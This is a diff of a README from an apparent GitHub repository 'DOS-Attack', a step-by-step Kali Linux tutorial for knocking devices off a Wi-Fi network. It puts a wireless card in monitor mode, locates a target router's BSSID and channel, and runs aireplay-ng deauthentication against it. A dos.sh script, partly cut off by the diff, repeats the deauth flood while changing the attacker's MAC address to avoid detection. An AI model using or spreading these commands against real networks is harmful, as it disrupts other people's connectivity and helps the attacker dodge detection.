@@ -1,6 +1,6 @@
 # DOS-Attack
 
----
+
 **What is DOS ATTACK?**
 
 In computing, a denial-of-service attack (DoS attack) is a cyber-attack in which the perpetrator seeks to make a machine or network resource unavailable to its intended users by temporarily or indefinitely disrupting services of a host connected to the Internet. Denial of service is typically accomplished by flooding the targeted machine or resource with superfluous requests in an attempt to overload systems and prevent some or all legitimate requests from being fulfilled.
@@ -10,13 +10,14 @@ For More Depth [Wikipedia](https://en.wikipedia.org/wiki/Denial-of-service_attac
 
 USING AIRCRACK-NG
 
-```
+```bash
 root@kali:~# ifconfig
 
 ```
 note down the name of your wireless interface
 here **wlan0** is used and create a .sh file (use your favourite text editor)
-```
+
+```bash
 root@kali:~#vi monitor.sh
 
 (for using vim editor type)
@@ -31,7 +32,7 @@ esc
 
 *And type the following command*
 
-```
+```bash
 #!/bin/bash
 
 ifconfig wlan0 down
@@ -43,7 +44,7 @@ iwconfig wlan0 | grep Mode
 
 In Another tab:
 
-```
+```bash
 root@kali:~# chmod +x monitor.sh
 root@kali:~# ./monitor.sh
 
@@ -71,7 +72,7 @@ Note down the channel no. and BSSID of the router you want to attack here we are
 channel=11
 **BBSID=BE:2A:16:CC:C4:C0**
 
-```
+```bash
 root@kali:~# iwconfig channel 11
 
 (switching to the required channel)
@@ -86,7 +87,7 @@ root@kali:~# aireplay-ng -0 0 -a BE:2A:16:CC:C4:C0 wlan0 -e ABHIJIT
 
 creating a .sh which will continuously send some deauthentication packets and then change the mac address of the system , sleeping for some seconds and then the process carries on
 
-```
+```bash
 root@kali:~# vi dos.sh
 
 #!/bin/bash
@@ -106,7 +107,7 @@ done
 ```
 **In different Tab**
 
-```
+```bash
 root@kali:~#chmod +x dos.sh
 
 root@kali:~#./dos.sh 11 BE:2A:16:CC:C4:C0
@@ -118,8 +119,9 @@ root@kali:~#./dos.sh 11 BE:2A:16:CC:C4:C0
 
 **NOTE**
 >after the process the wireless interface can show trouble so run the below code or  reboot your system
-```
+```bash
 root@kali:~#service network-manager restart
 
 ```
+Author - [Kakí_epíthesi](https://github.com/kaki-epithesi)
 [ALL CODES](https://github.com/kaki-epithesi/dos-attack)
